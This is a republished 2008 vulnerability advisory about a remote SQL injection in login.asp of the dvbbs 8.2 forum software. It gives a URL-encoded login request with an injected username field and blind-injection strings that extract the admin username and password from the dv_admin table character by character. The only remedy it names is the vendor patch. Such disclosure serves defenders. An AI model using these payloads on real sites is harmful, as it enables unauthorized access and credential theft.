---
title: dvbbs8.2(access/sql)版 login.asp远程注入漏洞exploit
description: Subject:dvbbs8.2(access/sql)versionlogin.aspremotesqlinjection - (dvbbs8.2access/sql版login.asp文件远程SQL注入漏洞)dangerlevel(危险级别):critical/High(危险/高)info:dvbbsispronetomultiplesqlinjectionsecurityflaw
date: 2008-06-01 03:45:18
category: 漏洞信息
tags: ['dvbbs', '数据库', '注入', '漏洞信息', 'exploit']
post_id: 504
alias: dvbbs8.2-access-sql-version-login.asp-remote-sql-injection
ViewNums: 6134
---

来源：seclists

email:
hackerb_at_hotmail.com

Subject:
dvbbs8.2(access/sql)version login.asp remote sql injection  -  (dvbbs8.2 access/sql版 login.asp文件远程SQL[注入](/tags/%E6%B3%A8%E5%85%A5)[漏洞](/tags/%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF))

danger level(危险级别):
critical/High(危险/高)

info:
dvbbs is prone to multiple sql injection security flaw

interrelated code to access version([exploit](/tags/exploit)):
password=123123&codestr=71&CookieDate=2&userhidden=2&comeurl=index.asp&submit=%u7ACB%u5373%u767B%u5F55&ajaxPost=1&username=where%2527%2520and%25201%253D%2528select%2520count%2528*%2529%2520from%2520dv_admin%2520where%2520left%2528username%252C1%2529%253D%2527a%2527%2529%2520and%2520%25271%2527%253D%25271

Examples(access version):
decide
Where and 1=1
where and 1=2
to get usernamer or password
where’ and 1=(select count(*) from dv_admin where left(username,1)=’a') and ‘1′=’1
where’ and 1=(select count(*) from dv_admin where left(username,2)=’ad’) and ‘1′=’1
…………………..
…………………..
where’ and 1=(select count(*) from dv_admin where left(password,1)=’1′) and ‘1′=’1
where’ and 1=(select count(*) from dv_admin where left(password,2)=’15′) and ‘1′=’1
………………….
………………….

Solution(解决办法):
Authorities patch(官方补丁)
dvbbs web site([http://www.dvbbs.net](http://www.dvbbs.net/))

References(参考):
dvbbs([http://www.dvbbs.net](http://www.dvbbs.net/))

